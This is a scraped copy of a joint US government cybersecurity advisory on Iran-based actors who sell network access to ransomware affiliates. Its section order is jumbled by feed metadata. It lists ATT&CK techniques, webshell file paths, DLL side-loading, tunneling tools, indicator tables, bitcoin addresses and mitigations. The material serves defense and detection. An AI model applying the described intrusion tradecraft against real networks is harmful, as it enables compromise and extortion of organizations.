<td>Iranian cyber actors attempt to enter security exemption tickets to the network security device or contractor to get their tools allowlisted.</td>
</tr>
<tr>
<td>Impair Defenses: Downgrade Attack</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/010/\" title=\"Impair Defenses: Downgrade Attack\">T1562.010</a></td>
<td>Iranian cyber actors lower PowerShell policies to a less secure level.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 6. Credential Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use or Assessed Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Input Capture</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1056/\" title=\"Input Capture\">T1056</a>&nbsp;</td>
<td>Iranian cyber actors capture login credentials on compromised Netscaler devices via a deployed webshell.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 7. Execution</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use or Assessed Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Command and Scripting</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting\">T1059.001</a></td>
<td>Iranian cyber actors use an admin account to initiate a remote desktop session to start Microsoft Windows PowerShell ISE.</td>
</tr>
<tr>
<td>Command and Scripting Interpreter</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter\">T1059.001</a></td>
<td>Iranian cyber actors enable servers to use Windows PowerShell Web Access.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 8. Discovery</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use or Assessed Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Query Registry</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1012/\" title=\"Query Registry\">T1012</a></td>
<td>Iranian cyber actors export registry hives and network firewall configurations.</td>
</tr>
<tr>
<td>Domain Trust Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1482/\" title=\"Domain Trust Discovery\">T1482</a></td>
<td>Iranian cyber actors exfiltrate account usernames from the domain controller and access configuration files and logs.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 9. Command and Control</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use or Assessed Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote Access Software</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1219/\">T1219</a></td>
<td>
<p>Iranian cyber actors install “AnyDesk” remote access program.</p>
<p>Iranian cyber actors deploy Meshcentral to connect with compromised servers for remote access.</p>
</td>
</tr>
<tr>
<td>Protocol Tunneling</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a></td>
<td>Iranian cyber actors use <code>ligolo / ligolo-ng</code> for open source tunneling and <code>ngrok[.]io</code> NGROK to create outbound connections to a random subdomain.</td>
</tr>
</tbody>
</table>
</div>
<div>
<h2><strong>Indicators of Compromise</strong></h2>
<h3>IP Address and Domain Identifiers</h3>
<p><strong>Disclaimer:</strong> The IP addresses and domains listed in <strong>Table 10</strong> were observed in use by the actors in the specified timeframes in 2024. The authoring agencies recommend organizations investigate or vet these IP addresses prior to taking action, such as blocking.</p>
<p><strong>Comment:&nbsp;</strong>In addition to the infrastructure provided in the table below, the FBI and CISA warn that these actors are known to leverage information obtained through intrusions into cloud-computing resources associated with victim organizations. The actors have used this cloud infrastructure to conduct further cyber operations targeting other organizations. The FBI observed use of this tradecraft against U.S. academic and defense sectors, but it could theoretically be used against any organization. The FBI and CISA warn that if these actors compromised your organization, they may be leveraging your cloud services accounts to conduct malicious cyber activity and target other victims. The FBI has observed instances of the actors using compromised cloud service accounts to transmit data stolen from other compromised organizations.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 10. Indicators of Compromise – Recent</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Indicator</th>
<th role=\"columnheader\">First Seen</th>
<th role=\"columnheader\">Most Recently Observed Date</th>
</tr>
</thead>
<tbody>
<tr>
<td>138.68.90[.]19</td>
<td>January 2024</td>
<td>August 2024</td>
</tr>
<tr>
<td>167.99.202[.]130</td>
<td>January 2024</td>
<td>August 2024</td>
</tr>
<tr>
<td>78.141.238[.]182</td>
<td>July 2024</td>
<td>August 2024</td>
</tr>
<tr>
<td>51.16.51[.]81</td>
<td>January 2024</td>
<td>August 2024</td>
</tr>
<tr>
<td>51.20.138[.]134</td>
<td>February 2024</td>
<td>August 2024</td>
</tr>
<tr>
<td>134.209.30[.]220</td>
<td>March 2024</td>
<td>August 2024</td>
</tr>
<tr>
<td>13.53.124[.]246</td>
<td>February 2024</td>
<td>August 2024</td>
</tr>
<tr>
<td>api.gupdate[.]net</td>
<td>September 2022</td>
<td>August 2024</td>
</tr>
<tr>
<td>githubapp[.]net</td>
<td>February 2024</td>
<td>August 2024</td>
</tr>
</tbody>
</table>
<p><strong>Disclaimer:</strong> The infrastructure in <strong>Table 11</strong> reflects historical IP addresses and domains associated with these actors. This data is being provided for informational purposes and to enable better tracking and attribution of these actors. The FBI and CISA do not recommend blocking of the indicators in <strong>Table 11&nbsp;</strong>based solely on their inclusion in this CSA.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><a><em>Table&nbsp;</em></a><em>11. Indicators of Compromise – Historical</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Indicator</th>
<th role=\"columnheader\">First Seen</th>
<th role=\"columnheader\">Most Recently Observed Date</th>
</tr>
</thead>
<tbody>
<tr>
<td>18.134.0[.]66</td>
<td>September 2023</td>
<td>November 2023</td>
</tr>
<tr>
<td>193.149.190[.]248</td>
<td>September 2023</td>
<td>January 2024</td>
</tr>
<tr>
<td>45.76.65[.]42</td>
<td>September 2023</td>
<td>December 2023</td>
</tr>
<tr>
<td>206.71.148[.]78</td>
<td>October 2023</td>
<td>January 2024</td>
</tr>
<tr>
<td>193.149.187[.]41</td>
<td>October 2023</td>
<td>November 2023</td>
</tr>
<tr>
<td>login.forticloud[.]online</td>
<td>October 2023</td>
<td>November 2023</td>
</tr>
<tr>
<td>fortigate.forticloud.[]online</td>
<td>October 2023</td>
<td>November 2023</td>
</tr>
<tr>
<td>cloud.sophos[.]one</td>
<td>October 2023</td>
<td>November 2023</td>
</tr>
</tbody>
</table>
</div>
<h3>Actor Identifiers</h3>
<p><strong>Disclaimer:</strong> The FBI observed the following identifiers associated with the Iranian cyber group and their ransomware affiliates. The FBI is providing this information to enable improved threat actor identification and tracking of malicious cyber activity. Please see <strong>Appendix A</strong> for list of TOX identifiers.</p>
<p>The FBI observed the threat actors to be associated with the following bitcoin address values:</p>
<ul>
<li><code>bc1q8n7jjgdepuym825zwwftr3qpem3tnjx3m50ku0</code></li>
<li><code>bc1qlwd94gf5uhdpu4gynk6znc5j3rwk9s53c0dhjs</code></li>
<li><code>bc1q2egjjzmchtm3q3h3een37zsvpph86hwgq4xskh</code></li>
<li><code>bc1qjzw7sh3pd5msgehdaurzv04pm40hm9ajpwjqky</code></li>
<li><code>bc1qn5tla384qxpl6zt7kd068hvl7y4a6rt684ufqp</code></li>
<li><code>bc1ql837eewad47zn0uzzjfgqjhsnf2yhkyxvxyjjc</code></li>
<li><code>bc1qy8pnttrfmyu4l3qcy59gmllzqq66gmr446ppcr</code></li>
<li><code>bc1q6620fmev7cvkfu82z43vwjtec6mzgcp5hjrdne</code></li>
<li><code>bc1qr6h2zcxlntpcjystxdf7qy2755p25yrwucm4lq</code></li>
<li><code>bc1qx9tteqhama2x2w9vwqsyny6hldh8my8udx5jlm</code></li>
<li><code>bc1qz75atxj4dvgezyuspw8yz9khtkuk5jpdgfauq8</code></li>
<li><code>bc1q6w2an66vrje747scecrgzucw9ksha66x9zt980</code></li>
<li><code>bc1qsn4l6h3mhyhmr72vw4ajxf2gr74hwpalks2tp9</code></li>
<li><code>bc1qtjhvqkun4uxtr4qmq6s3f7j49nr4sp0wywp489</code></li>
</ul>
<h2><strong>Mitigations</strong></h2>
<p>The FBI and CISA recommend all organizations implement the mitigations listed below to improve their cybersecurity posture based on the Iranian cyber group’s activity. The FBI judges the group’s targeting is primarily based on the identification of devices vulnerable to CVEs named in this notification (see <strong>Technical Details</strong> section for a list of CVEs). As such, any U.S. organization deploying software with these vulnerabilities may be targeted for further exploitation and should follow this guidance to defend against exploitation by this group.</p>
<p>These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s&nbsp;<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>
<p>The FBI and CISA recommend all organizations implement the following mitigations:</p>
<ul>
<li>Review available logs for IP addresses in <strong>Table 10</strong> for indications of traffic with your organization’s network in the provided timeframes [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DetectingRelevantThreatsandTTPs3A\" title=\"Detecting Relevant Threats and TTPs (3.A)\">CPG 3.A</a>]. The indicators in Table 11 should also be reviewed to identify historical activity or incidents which may have previously been identified by your organization.</li>
<li>Apply patches and/or mitigations for CVE-2024-3400, CVE-2022-1388, CVE-2019-19781, and CVE-2023-3519 [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#MitigatingKnownVulnerabilities1E\" title=\"Mitigating Known Vulnerabilities (1.E)\">CPG 1.E</a>].
<ul>
<li>Be advised, patching for the above referenced CVEs may be insufficient to mitigate malicious activity if your network has already been compromised by these actors while the network device was vulnerable. Additional investigation into the use of stolen credentials (e.g., via the webshell on Netscaler devices) is strongly encouraged to identify threat actor attempts to establish footholds on other parts of the network [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DetectingRelevantThreatsandTTPs3A\" title=\"Detecting Relevant Threats and TTPs (3.A)\">CPG 3.A</a>].</li>
</ul>
</li>
<li>Check your systems for the unique identifiers and TTPs used by the actors when operating on compromised networks, including creation of specific usernames, use of NGROK and Ligolo, and deployment of webshells in specific directories [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DetectingRelevantThreatsandTTPs3A\" title=\"Detecting Relevant Threats and TTPs (3.A)\">CPG 3.A</a>].</li>
<li>Check your systems for outbound web requests to <code>files.catbox[.]moe</code> and <code>***.ngrok[.]io</code> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DetectingRelevantThreatsandTTPs3A\" title=\"Detecting Relevant Threats and TTPs (3.A)\">CPG 3.A</a>].</li>
</ul>
<h2><strong>Validate Security Controls</strong></h2>
<p>In addition to applying mitigations, the FBI and CISA recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. The authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>
<p>To get started:</p>
<ol>
<li>Select an ATT&amp;CK technique described in this advisory (see <strong>Table 2</strong> to <strong>Table 10</strong>).</li>
<li>Align your security technologies against the technique.</li>
<li>Test your technologies against the technique.</li>
<li>Analyze your detection and prevention technologies’ performance.</li>
<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>
<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>
</ol>
<h2><strong>References</strong></h2>
<ol>
<li><a href=\"https://attack.mitre.org/versions/v15/groups/G0117/\" title=\"Fox Kitten\">Fox Kitten, UNC757, Parisite, Pioneer Kitten, RUBIDIUM, Lemon Sandstorm, Group G0117 | MITRE ATT&amp;CK®</a>&nbsp;</li>
<li><a href=\"https://www.crowdstrike.com/blog/who-is-pioneer-kitten/\" title=\"Who Is PIONEER KITTEN?\">PIONEER KITTEN: Targets &amp; Methods [Adversary Profile] (crowdstrike.com)</a></li>
<li><a href=\"https://www.sentinelone.com/anthology/noescape/\" title=\"NoEscape Ransomware: In-Depth Analysis, Detection, and Mitigation\">NoEscape - SentinelOne</a></li>
<li><a href=\"https://www.sentinelone.com/anthology/ransomhouse/\" title=\"RansomHouse Ransomware: In-Depth Analysis, Detection, and Mitigation\">RansomHouse - SentinelOne</a></li>
<li><a href=\"https://attack.mitre.org/versions/v15/software/S0556/\" title=\"Pay2Key\">Pay2Key, Software S0556 | MITRE ATT&amp;CK®</a></li>
<li><a href=\"https://research.checkpoint.com/2020/ransomware-alert-pay2key/\" title=\"Ransomware Alert: Pay2Key\">Pay2Key Ransomware Alert - Check Point Research</a></li>
</ol>
<h2><strong>Reporting</strong></h2>
<p>Your organization has no obligation to respond or provide information back to the FBI in response to this joint advisory. If, after reviewing the information provided, your organization decides to provide information to the FBI, reporting must be consistent with applicable state and federal laws.</p>
<h3>Ransomware Incidents</h3>
<p>The FBI and CISA are interested in any information that can be shared in the case of a ransomware incident, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with threat actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.</p>
<p>Additional details of interest include a targeted company point of contact, status and scope of infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial attack vector, and host- and network-based indicators.</p>
<p>The FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to the FBI’s <a href=\"https://www.ic3.gov/Home/ComplaintChoice\" title=\"Internet Crime Complain Center (IC3)\">Internet Crime Complain Center (IC3)</a>, your <a href=\"https://www.fbi.gov/contact-us/field-offices\" title=\"Field Offices\">local FBI Field Office</a>, or CISA via the agency’s <a href=\"https://www.cisa.gov/report\" title=\"Report to CISA\">Incident Reporting Form</a> or its 24/7 Operations Center (<a href=\"mailto:report@cisa.gov)\" title=\"Report to CISA\">report@cisa.gov</a>), or by calling 1-844-Say-CISA (1-844-729-2472).</p>
<h3>Other Incidents</h3>
<p>U.S. organizations are encouraged to report suspicious or criminal activity related to information in this advisory to the FBI’s <a href=\"https://www.ic3.gov/Home/ComplaintChoice\" title=\"Internet Crime Complain Center (IC3)\">Internet IC3</a> or your <a href=\"https://www.fbi.gov/contact-us/field-offices\" title=\"Field Offices\">local FBI Field Office</a>. Report suspicious or malicious cyber activity to CISA via the agency’s <a href=\"https://www.cisa.gov/report\" title=\"Report to CISA\">Incident Reporting Form</a> or its 24/7 Operations Center (<a href=\"mailto:report@cisa.gov\" title=\"Report to CISA\">report@cisa.gov</a>) or by calling 1-844-Say-CISA (1-844-729-2472). When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.</p>
<h2><strong>Disclaimer</strong></h2>
<p>The information in this report is being provided “as is” for informational purposes only. The FBI and CISA do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI and CISA.</p>
<h2><strong>Version History</strong></h2>
<p><strong>August 20, 2024:</strong> Initial version.</p>
<h2><strong>Appendix A: TOX Identifiers</strong></h2>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">TOX Identifier</th>
<th role=\"columnheader\">TOX Public Key</th>
<th role=\"columnheader\">Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>xplfinder</td>
<td>ea2ec0c3859d8d8c36d95a298beef6d7add17856655bfbea2554b8714f7c7c69</td>
<td>Iranian cyber group</td>
</tr>
<tr>
<td>Br0k3r</td>
<td>B761680E23F2EBB5F6887D315EBD05B2D7C365731E093B49ADB059C3DCCAA30C</td>
<td>Iranian cyber group</td>
</tr>
<tr>
<td>Access</td>
<td>185ADA4556737A4F26AE16F1A99CA82AB5684C32719EE426C420C0BC14384A0A</td>
<td>Ransomware affiliate</td>
</tr>
<tr>
<td>Admin ALPHV aka BlackCat</td>
<td>3488458145EB62D7D3947E3811234F4663D9B5AEEF6584AB08A2099A7F946664</td>
<td>Ransomware affiliate</td>
</tr>
<tr>
<td>Admin_NoEscape</td>
<td>0A6F992E1372DB4F245595424A7436EBB610775D6ADDC4D568ACC2AF5D315221</td>
<td>Ransomware affiliate</td>
</tr>
<tr>
<td>Americano_Sneeckers</td>
<td>14F8AD7D1553D1A47CF4C9E7BEDABCC5B759C86E54C636175A472C11D7DEC70F</td>
<td>Ransomware affiliate</td>
</tr>
<tr>
<td>Bettersock</td>
<td>2C76104C9AAAF32453A814C227E7D9D755451B551A3FD30D2EA332DF396B3A31</td>
<td>Ransomware affiliate</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>" "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-241a" (26312 33681) new 5 nil nil ((title nil "Iran-based Cyber Actors Enabling Ransomware Attacks on US Organizations") (link nil "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-241a") (description nil "<h2><strong>Summary</strong></h2>
<p>The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), and the Department of Defense Cyber Crime Center (DC3) are releasing this joint Cybersecurity Advisory (CSA) to warn network defenders that, as of August 2024, a group of Iran-based cyber actors continues to exploit U.S. and foreign organizations. This includes organizations across several sectors in the U.S. (including in the education, finance, healthcare, and defense sectors as well as local government entities) and other countries (including in Israel, Azerbaijan, and the United Arab Emirates). The FBI assesses a significant percentage of these threat actors’ operations against US organizations are intended to obtain and develop network access to then collaborate with ransomware affiliate actors to deploy ransomware. The FBI further assesses these Iran-based cyber actors are associated with the Government of Iran (GOI) and—separate from the ransomware activity—conduct computer network exploitation activity in support of the GOI (such as intrusions enabling the theft of sensitive technical data against organizations in Israel and Azerbaijan).</p>
<p>This CSA provides the threat actor’s tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs), as well as highlights similar activity from a previous advisory (<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-259a\" title=\"Iran-Based Threat Actor Exploits VPN Vulnerabilities\">Iran-Based Threat Actor Exploits VPN Vulnerabilities</a>) that the FBI and CISA published on Sept. 15, 2020. The information and guidance in this advisory are derived from FBI investigative activity and technical analysis of this group’s intrusion activity against U.S. organizations and engagements with numerous entities impacted by this malicious activity.</p>
<p>The FBI recommends all organizations follow guidance provided in the <strong>Mitigations</strong> section of this advisory to defend against the Iranian cyber actors’ activity.</p>
<p>If organizations believe they have been targeted or compromised by the Iranian cyber actors, the FBI and CISA recommend immediately contacting your <a href=\"https://www.fbi.gov/contact-us/field-offices\" title=\"Field Offices\">local FBI field office</a> for assistance and/or reporting the incident via CISA’s <a href=\"https://www.cisa.gov/report\" title=\"Report to CISA\">Incident Reporting Form</a> (see the <strong>Reporting&nbsp;</strong>section of this advisory for more details and contact methods).</p>
<p>For more information on Iran state-sponsored malicious cyber activity, see CISA’s <a href=\"https://www.cisa.gov/topics/cyber-threats-and-advisories/advanced-persistent-threats/iran\" title=\"Iran Cyber Threat Overview and Advisories\">Iran Cyber Threat</a> webpage.</p>
<p>Download the PDF version of this report:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-08/aa24-241a-iran-based-cyber-actors-enabling-ransomware-attacks-on-us-organizations_0.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-241A Iran-based Cyber Actors Enabling Ransomware Attacks on US Organizations</a>
    <span class=\"c-file__size\">(PDF,       582.01 KB
  )</span>
  </div>
</div>
<p>For a downloadable copy of IOCs, see:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-08/AA24-241A.stix_.xml\" class=\"c-file__link\" target=\"_blank\">AA24-241A STIX XML</a>
    <span class=\"c-file__size\">(XML,       29.02 KB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-08/AA24-241A-Iran-based-Cyber-Actors-Enabling-Ransomware-Attacks-on-US-Organizations.stix_.json\" class=\"c-file__link\" target=\"_blank\">AA24-241A STIX JSON</a>
    <span class=\"c-file__size\">(JSON,       29.19 KB
  )</span>
  </div>
</div>
<h2><strong>Threat Actor Details</strong></h2>
<h3>Background on Threat Group and Prior Activity</h3>
<p>This advisory outlines activity by a specific group of Iranian cyber actors that has conducted a high volume of computer network intrusion attempts against U.S. organizations since 2017 and as recently as August 2024. Compromised organizations include U.S.-based schools, municipal governments, financial institutions, and healthcare facilities. This group is known in the private sector by the names Pioneer Kitten, Fox Kitten, UNC757, Parisite, RUBIDIUM, and Lemon Sandstorm.[<a href=\"https://attack.mitre.org/versions/v15/groups/G0117/\" title=\"Fox Kitten\">1</a>][<a href=\"https://www.crowdstrike.com/blog/who-is-pioneer-kitten/\" title=\"Who Is PIONEER KITTEN?\">2</a>] The actors also refer to themselves by the moniker Br0k3r, and as of 2024, they have been operating under the moniker “xplfinder” in their channels. FBI analysis and investigation indicate the group’s activity is consistent with a cyber actor with Iranian state-sponsorship.</p>
<p>The FBI previously observed these actors attempt to monetize their access to victim organizations on cyber marketplaces. A significant percentage of the group’s US-focused cyber activity is in furtherance of obtaining and maintaining technical access to victim networks to enable future ransomware attacks. The actors offer full domain control privileges, as well as domain admin credentials, to numerous networks worldwide. More recently, the FBI identified these actors collaborating directly with ransomware affiliates to enable encryption operations in exchange for a percentage of the ransom payments. These actors have collaborated with the ransomware affiliates NoEscape[<a href=\"https://www.sentinelone.com/anthology/noescape/\" title=\"NoEscape Ransomware: In-Depth Analysis, Detection, and Mitigation\">3</a>], Ransomhouse[<a href=\"https://www.sentinelone.com/anthology/ransomhouse/\" title=\"RansomHouse Ransomware: In-Depth Analysis, Detection, and Mitigation\">4</a>], and ALPHV (aka BlackCat) (<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-353a\" title=\"#StopRansomware: ALPHV Blackcat\">#StopRansomware: ALPHV Blackcat</a>). The Iranian cyber actors’ involvement in these ransomware attacks goes beyond providing access; they work closely with ransomware affiliates to lock victim networks and strategize on approaches to extort victims. The FBI assesses these actors do not disclose their Iran-based location to their ransomware affiliate contacts and are intentionally vague as to their nationality and origin.</p>
<p>Furthermore, the FBI has historically observed this actor conduct hack-and-leak campaigns, such as the late 2020 campaign known as Pay2Key.[<a href=\"https://attack.mitre.org/versions/v15/software/S0556/\" title=\"Pay2Key\">5</a>],[<a href=\"https://research.checkpoint.com/2020/ransomware-alert-pay2key/\" title=\"Ransomware Alert: Pay2Key\">6</a>] The actors operated a <code>.onion</code> site (reachable through the Tor browser) hosted on cloud infrastructure registered to an organization previously compromised by the actors. (The actors created the server leveraging their prior access to this victim.)&nbsp;Following the compromise and the subsequent unauthorized acquisition of victim data, the actors publicized news of their compromise (including on social media), tagging accounts of victim and media organizations, and leaking victim data on their <code>.onion</code> site. While this technique has traditionally been used to influence victims to pay ransoms, the FBI does not believe the objective of Pay2Key was to obtain ransom payments. Rather, the FBI assesses Pay2Key was an information operation aimed at undermining the security of Israel-based cyber infrastructure.</p>
<h3>Attribution Details</h3>
<p>FBI investigation identified that the Iranian cyber actors conduct malicious cyber activity, which FBI assessed to be in support of the GOI. The FBI judges this activity to be separate from the previously referenced ransomware-enabling activity. This group directs their activity towards countries and organizations consistent with Iranian state interests, and typically not of interest to the group’s ransomware affiliate contacts, such as U.S. defense sector networks, and those in Israel, Azerbaijan, United Arab Emirates. Instead, it is intended to steal sensitive information from these networks, suggesting the group maintains an association with the GOI. However, the group’s ransomware activities are likely not sanctioned by the GOI, as the actors have expressed concern for government monitoring of cryptocurrency movement associated with their malicious activity.</p>
<p>The group uses the Iranian company name Danesh Novin Sahand (identification number 14007585836), likely as a cover IT entity for the group’s malicious cyber activities.</p>
<h2><strong>Technical Details</strong></h2>
<p><strong>Note:</strong> This advisory uses the <a href=\"https://attack.mitre.org/versions/v15/matrices/enterprise/\">MITRE ATT&amp;CK<sup>®</sup></a><a href=\"https://attack.mitre.org/versions/v15/matrices/enterprise/\" title=\"Enterprise Matrix\"> Matrix for Enterprise</a> framework, version 15.1. See the <strong>MITRE ATT&amp;CK Tactics and Techniques</strong> section for a table of the threat actors’ activity mapped to MITRE ATT&amp;CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\" title=\"Best Practices for MITRE ATT&amp;CK Mapping\">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href=\"https://github.com/cisagov/Decider/\" title=\"cisagov / decider\">Decider Tool</a>.</p>
<h3>Overview of Observed Tactics, Techniques, and Procedures</h3>
<p>The Iranian cyber actors’ initial intrusions rely upon exploits of remote external services on internet-facing assets to gain initial access to victim networks. As of July 2024, these actors have been observed scanning IP addresses hosting Check Point Security Gateways, probing for devices potentially vulnerable to CVE-2024-24919. As of April 2024, these actors have conducted mass scanning of IP addresses hosting Palo Alto Networks PAN-OS and GlobalProtect VPN devices. The actors were likely conducting reconnaissance and probing for devices vulnerable to CVE-2024-3400. Historically, this group has exploited organizations by leveraging CVE-2019-19781 and CVE-2023-3519 related to Citrix Netscaler, and CVE-2022-1388 related to BIG-IP F5 devices.</p>
<h3>Reconnaissance, Initial Access, Persistence, and Credential Access</h3>
<p>The actors have been observed using the Shodan search engine to identify and enumerate IP addresses that host devices vulnerable to a particular CVE. The actors’ initial access is usually obtained via exploiting a public-facing networking device, such as Citrix Netscaler (CVE-2019-19781 and CVE-2023-3519), F5 BIG-IP (CVE-2022-1388), Pulse Secure/Ivanti VPNs (CVE-2024-21887), and, more recently, PanOS firewalls (CVE-2024-3400) [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1596/\" title=\"Search Open Technical Databases\">T1596</a>][<a href=\"https://attack.mitre.org/versions/v15/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a>].</p>
<p>Following exploitation of vulnerable devices, the actors use the following techniques:</p>
<ul>
<li>Capture login credentials using webshells on compromised Netscaler devices and append to file named <code>netscaler.1</code> in the same directory as the webshell [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1505/003/\" title=\"Server Software Component: Web Shell\">T1505.003</a>][<a href=\"https://attack.mitre.org/versions/v15/techniques/T1056/\" title=\"Input Capture\">T1056</a>].</li>
<li>Create the directory <code>/var/vpn/themes/imgs/</code> on Citrix Netscaler devices to deploy a webshell [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1505/003/\" title=\"Server Software Component: Web Shell\">T1505.003</a>]. Malicious files deployed to this directory include:
<ul>
<li><code>netscaler.1</code></li>
<li><code>netscaler.php</code></li>
<li><code>ctxHeaderLogon.php</code></li>
</ul>
</li>
<li>Specifically related to Netscaler, place additional webshells on compromised devices immediately after system owners patch the exploited vulnerability [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1505/003/\" title=\"Server Software Component: Web Shell\">T1505.003</a>]. The following file locations and filenames have been observed on devices:
<ul>
<li><code>/netscaler/logon/LogonPoint/uiareas/ui_style.php</code></li>
<li><code>/netscaler/logon/sanpdebug.php&nbsp;</code></li>
</ul>
</li>
<li>Create the directory <code>/xui/common/images/</code> on targeted IP addresses [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1133/\">T1133</a>].</li>
<li>Create accounts on victim networks; observed names include “sqladmin$,” “adfsservice,” “IIS_Admin,” “iis-admin,” and “John McCain” [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1136/\" title=\"Create Account\">T1136.001</a>].</li>
<li>Request exemptions to the zero-trust application and security policies for tools they intend to deploy on a victim network [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1098/\" title=\"Account Manipulation\">T1098</a>].</li>
<li>Create malicious scheduled task SpaceAgentTaskMgrSHR in <code>Windows/Spaceport/</code> task folder. This task uses a DLL side-loading technique against the signed Microsoft SysInternals executable <code>contig.exe</code>, which may be renamed to <code>dllhost.ext</code>, to load a payload from version.dll. This file has been observed being executed from the Windows Downloads directory [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1053/\" title=\"Scheduled Task/Job\">T1053</a>].&nbsp;</li>
